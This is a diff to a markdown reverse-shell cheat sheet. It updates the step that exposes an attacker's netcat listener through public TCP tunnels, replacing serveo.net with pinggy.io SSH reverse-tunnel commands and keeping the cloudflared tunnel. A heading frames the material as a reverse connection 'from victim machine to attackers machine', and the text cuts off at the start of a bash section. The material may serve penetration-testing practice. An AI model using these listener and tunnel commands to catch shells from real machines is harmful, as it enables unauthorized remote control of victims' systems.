@@ -5,8 +5,12 @@
 * macOS `nc -v -l 3000`
 
 #### optional - get public address by creating a tcp reverse tunnel
-- `ssh -R 0:localhost:3000 serveo.net`
-- `cloudflared tunnel --url tcp://localhost:3000`
+
+- pinggy.io 
+  - https `ssh     free.pinggy.io -p 443 -R0:localhost:<local-port> `
+  - tcp   `ssh tcp@free.pinggy.io -p 443 -R0:localhost:<local-port> `
+
+- cloudflare `cloudflared tunnel --url tcp://localhost:3000`
 
 ## reverse connect from victim machine to attackers machine
 ### bash
